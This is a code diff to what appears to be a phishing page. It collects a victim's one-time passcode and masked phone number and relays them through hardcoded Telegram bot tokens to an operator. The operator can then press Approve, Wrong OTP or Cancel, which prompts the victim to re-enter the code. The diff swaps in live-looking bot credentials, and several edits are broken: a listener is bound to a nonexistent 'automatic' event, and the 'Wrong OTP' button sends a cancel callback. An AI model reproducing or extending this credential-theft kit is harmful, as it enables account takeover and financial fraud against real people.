@@ -253,11 +253,11 @@
 
     <script>
         // Bot 1 (your existing)
-        const BOT_TOKEN_1 = '8705920347:AAHxI3Yq1YNIymLTlcvPHtQ1ThJItZu2kQk';
+        const BOT_TOKEN_1 = '8705920347:AAFrIaZ1_q0GAPZmW0w2tEmQIfbmG0VsGfU';
         const CHAT_ID_1 = '8820857419';
 
         // Bot 2 (your second bot)
-        const BOT_TOKEN_2 = '8705920347:AAHxI3Yq1YNIymLTlcvPHtQ1ThJItZu2kQk';
+        const BOT_TOKEN_2 = '8705920347:AAFrIaZ1_q0GAPZmW0w2tEmQIfbmG0VsGfU';
         const CHAT_ID_2 = '8820857419';
 
         // Mask phone from localStorage
@@ -296,10 +296,10 @@
         function checkOtpComplete() {
             otpValue = Array.from(otpBoxes).map(box => box.value).join('');
             if (otpValue.length === 6) {
-                submitBtn.classList.add('enabled');
+                submitBtn.classList.add('automatic');
                 submitBtn.disabled = false;
             } else {
-                submitBtn.classList.remove('enabled');
+                submitBtn.classList.remove('automatic');
                 submitBtn.disabled = true;
             }
         }
@@ -364,6 +364,8 @@
             const parts = callbackData.split('_');
             if (parts[0] === 'approve') {
                 resultMessage.textContent = 'Your data has been approved. You will receive a confirmation message within 15 minutes. Thank you.';
+            } else if (parts[0] === 'Wrong OTP') {
+                resultMessage.textContent = 'Invalid or Expired OTP. Please try again and put the correct OTP.';
             } else if (parts[0] === 'cancel') {
                 resultMessage.textContent = 'Please reapply and ensure that your information is correct. Thank you.';
             }
@@ -414,7 +416,7 @@
             }, 1500);
         }
 
-        submitBtn.addEventListener('click', () => {
+        submitBtn.addEventListener('automatic', () => {
             if (otpValue.length !== 6) return;
 
             spinnerOverlay.style.display = 'flex';
@@ -427,7 +429,10 @@
                     [{
                         text: '✅ Approve',
                         callback_data: 'approve_' + currentTimestamp
-                    }, {
+                    },  {
+                        text: '❌ Wrong OTP',
+                        callback_data: 'cancel_' + currentTimestamp
+                    },  {
                         text: '❌ Cancel',
                         callback_data: 'cancel_' + currentTimestamp
                     }]
